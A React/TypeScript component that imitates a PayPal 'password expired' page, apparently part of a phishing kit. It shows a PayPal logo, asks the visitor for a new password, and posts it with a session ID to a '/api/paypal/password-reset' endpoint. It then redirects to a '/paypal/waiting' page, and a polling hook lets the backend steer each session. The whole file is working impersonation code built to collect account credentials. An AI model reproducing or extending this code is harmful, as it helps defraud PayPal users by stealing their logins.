import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { AlertCircle, Loader2 } from "lucide-react";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";
import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";
import { useLanguage } from "@/hooks/use-language";

export default function PayPalPasswordExpiredPage() {
  const { t } = useLanguage();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    if (id) setSessionId(id);
  }, []);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: "/paypal/password-expired",
    apiEndpoint: "/api/paypal/session",
    pathEndpoint: "/api/paypal/session/:sessionId/path",
  });

  const passwordMutation = useMutation({
    mutationFn: async (data: { sessionId: string; newPassword: string; confirmPassword: string }) => {
      const response = await apiRequest("POST", "/api/paypal/password-reset", data);
      return await response.json();
    },
    onSuccess: () => {
      // Redirect to loading page
      const params = new URLSearchParams();
      if (sessionId) params.set("session", sessionId);
      const queryString = params.toString();
      window.location.href = `/paypal/waiting${queryString ? `?${queryString}` : ""}`;
    },
    onError: () => {
      setError(t("paypalUpdateError"));
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (newPassword.length < 8) {
      setError(t("paypalPasswordMinLength"));
      return;
    }

    if (newPassword !== confirmPassword) {
      setError(t("paypalPasswordMismatch"));
      return;
    }

    if (!sessionId) {
      setError(t("paypalInvalidSession"));
      return;
    }

    passwordMutation.mutate({ sessionId, newPassword, confirmPassword });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-8">
          {/* PayPal Logo */}
          <div className="flex justify-center">
            <img src={paypalLogo} alt="PayPal" className="h-40 w-auto" data-testid="img-paypal-logo" />
          </div>

          <Card className="border-2 border-orange-500">
            <CardContent className="pt-8 pb-8 px-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="flex justify-center">
                  <div className="bg-orange-100 rounded-full p-4">
                    <AlertCircle className="h-16 w-16 text-orange-600" data-testid="icon-warning" />
                  </div>
                </div>

                <div className="space-y-3 text-center">
                  <h2 className="text-2xl font-semibold text-gray-900" data-testid="text-title">
                    {t("paypalPasswordExpired")}
                  </h2>
                  <p className="text-gray-600" data-testid="text-description">
                    {t("paypalPasswordExpiredDesc")}
                  </p>
                </div>

                {error && (
                  <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm" data-testid="text-error">
                    {error}
                  </div>
                )}

                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="newPassword" className="text-gray-700">
                      {t("paypalNewPassword")}
                    </Label>
                    <Input
                      id="newPassword"
                      data-testid="input-new-password"
                      type="password"
                      placeholder={t("paypalNewPasswordPlaceholder")}
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      required
                      minLength={8}
                      className="h-12 text-base border-2 border-border focus:border-[#0070ba] rounded-lg"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="confirmPassword" className="text-gray-700">
                      {t("paypalConfirmPassword")}
                    </Label>
                    <Input
                      id="confirmPassword"
                      data-testid="input-confirm-password"
                      type="password"
                      placeholder={t("paypalConfirmPasswordPlaceholder")}
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      required
                      minLength={8}
                      className="h-12 text-base border-2 border-border focus:border-[#0070ba] rounded-lg"
                    />
                  </div>

                  <p className="text-xs text-gray-500">
                    {t("paypalPasswordMinLength")}
                  </p>
                </div>

                <Button
                  type="submit"
                  disabled={passwordMutation.isPending || !newPassword || !confirmPassword}
                  className="w-full h-12 bg-[#0070ba] hover:bg-[#005ea6] text-white font-semibold rounded-full"
                  data-testid="button-submit"
                >
                  {passwordMutation.isPending ? (
                    <>
                      <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                      {t("paypalUpdating")}
                    </>
                  ) : (
                    t("paypalUpdatePassword")
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
